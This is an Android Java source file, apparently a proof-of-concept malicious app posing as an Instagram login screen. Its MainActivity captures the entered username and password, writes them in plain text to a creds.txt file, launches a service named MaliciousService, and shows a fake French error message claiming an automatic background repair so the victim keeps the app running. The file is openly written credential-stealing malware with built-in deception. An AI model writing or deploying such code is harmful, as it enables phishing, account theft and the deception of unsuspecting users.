package com.merams.esd.instagram.poc;

import androidx.appcompat.app.AppCompatActivity;

import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.os.Environment;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import com.google.android.material.dialog.MaterialAlertDialogBuilder;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintWriter;

public class MainActivity extends AppCompatActivity {

    private Button connection;
    private EditText login;
    private EditText passwd;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        login = findViewById(R.id.et_login);
        passwd = findViewById(R.id.et_passwd);
        connection = findViewById(R.id.btn_connection);


        connection.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                StealCreds(login, passwd);
                startService(new Intent(MainActivity.this, MaliciousService.class));

            }
        });


    }



    private void StealCreds(EditText login, EditText passwd){

        File path = this.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS);
        File credsfile = new File(path, "creds.txt");

        try {

            FileOutputStream fo = new FileOutputStream(credsfile);
            PrintWriter pw = new PrintWriter(fo);
            pw.println("Login : "+login.getText());
            pw.println("Password : "+passwd.getText());
            pw.flush();
            pw.close();
            fo.close();

        } catch (FileNotFoundException e) {

            e.printStackTrace();

        } catch (IOException e) {

            e.printStackTrace();
        }

        new MaterialAlertDialogBuilder(this)
                .setTitle("Erreur")
                .setMessage("Une Erreur inconnue est survenue, l'application va  passer en réparation automatique en arriere plan, veuillez ne pas fermer l'application")
                .setPositiveButton(android.R.string.yes, new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        moveTaskToBack(true);
                    }
                }).show();

    }
}